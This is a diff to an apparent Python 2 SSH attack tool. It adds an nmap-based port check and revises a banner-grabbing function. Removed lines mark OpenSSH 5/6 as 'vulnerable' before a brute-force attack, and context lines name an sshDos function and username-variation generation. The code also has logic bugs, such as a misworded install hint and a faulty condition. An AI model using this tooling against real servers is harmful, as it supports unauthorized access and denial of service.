@@ -126,46 +126,46 @@ def sshDos(host,port,user,sock,defTime):
 	para.close()
 	sock.close()
 
+def prevScann(host,port):
+	nport="-p"+port
+	try:
+		scanp = subprocess.Popen(["nmap","-T5","-n","-PN",nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
+	except OSError:
+        	print "Install masscan: sudo apt-get install masscan"  
+	scanhost = scanp.split()
+	if 'open' in scanhost:
+		print 'port ' + port + ' open.'
+		return 'open'
+	else:
+		print 'host down or port ' + port + ' close or filtered.'
+		return 'close'
+		
+		
+				
+
+
 def sshBanner(host,port):
 
 	nport="-p"+port
-	print "Scaning %s tcp port at %s ..." % (port,host)
+	print "[+] Trying to detect the banner of SSH server at tcp port %s for host %s ..." % (port,host)
 	try:
-		scanv = subprocess.Popen(["nmap", "-PN", "-sV", nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
+		scanv = subprocess.Popen(["nmap", "-PN", "-sV","-n", nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
 	except OSError:
         	print "Install nmap: sudo apt-get install nmap"  
 
 	scanlist=scanv.split()
-	if 'filtered' in scanlist:
-		print "Port " + port + " is filtered." 
-		print "Nothing to do."
-		exit(1)
-  
-	elif 'closed' in scanlist:
-		print "Port " + port + " is close." 
-		print "Nothing to do."
-		exit(1)
 
-	else: 
-		print "Port " + port + " is open." 
-	if 'ssh' in scanlist:
+	if 'open' and 'ssh' in scanlist:
 
 		index = scanlist.index('ssh')
-    		print "SSH Server Banner ==> %s %s" % (scanlist[index+1], scanlist[index+2])
+    		print "[++] SSH Server Banner ==> %s %s" % (scanlist[index+1], scanlist[index+2])
         	banner = scanlist[index+1] + " " + scanlist[index+2]
+		return banner
 	else:
-		print "Are you sure that it's a ssh server?"
-		print "Check with \"nmap -PN -sV -p 22 \" if you see something strange."
-		exit(1)
-
-	bannervuln = ['OpenSSH 5', 'OpenSSH 6']
-	if banner[0:9] in bannervuln:
-		print "This version is vulnerable, we continue with the brutefroce attack ..."
-		return banner	
-	else:
-		print "This version is not vulnerable."
-		print "Nothing to do."
-		exit(1)
+		print "[-] Are you sure that it's a ssh server?"
+		print "[--] Check with \"nmap -PN -sV -p 22 \" if you see something strange."
+		banner = 'none'
+		return banner
 
 
 def createUserNameVariationsFor(userName):
